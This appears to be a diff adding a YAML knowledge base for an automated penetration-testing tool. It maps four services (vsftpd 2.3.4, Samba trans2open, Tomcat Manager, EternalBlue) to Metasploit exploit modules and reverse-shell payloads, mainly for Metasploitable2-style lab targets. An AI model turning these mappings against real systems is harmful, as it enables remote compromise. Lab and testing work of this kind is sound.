@@ -1,0 +1,36 @@
+# knowledge_base.yml
+# Maps discovered services/CVEs to Metasploit modules
+
+exploit_mappings:
+  # 1. vsftpd 2.3.4 Backdoor (Metasploitable2)
+  - service_name: "vsftpd"
+    version_regex: "2.3.4"
+    cve: "CVE-2011-2523"
+    msf_module: "exploit/unix/ftp/vsftpd_234_backdoor"
+    target_port: 21
+    payload: "cmd/unix/interact"
+    description: "Exploits the malicious backdoor in vsftpd 2.3.4 (Metasploitable2)."
+
+  # 2. Samba trans2open (Metasploitable2/Old Linux)
+  - service_name: "netbios-ssn"
+    cve: "CVE-2003-0201"
+    msf_module: "exploit/linux/samba/trans2open"
+    target_port: 139
+    payload: "linux/x86/meterpreter/reverse_tcp"
+    description: "Exploits a buffer overflow in Samba (trans2open)."
+
+  # 3. Apache Tomcat Manager Default Creds
+  - service_name: "http"
+    product_regex: "Apache Tomcat"
+    msf_module: "exploit/multi/http/tomcat_mgr_deploy"
+    target_port: 8080
+    payload: "java/meterpreter/reverse_tcp"
+    description: "Uploads a payload via Tomcat Manager using default credentials."
+
+  # 4. EternalBlue (Windows 7/2008)
+  - service_name: "microsoft-ds"
+    cve: "CVE-2017-0144"
+    msf_module: "exploit/windows/smb/ms17_010_eternalblue"
+    target_port: 445
+    payload: "windows/x64/meterpreter/reverse_tcp"
+    description: "Exploits MS17-010 (EternalBlue) for remote code execution."
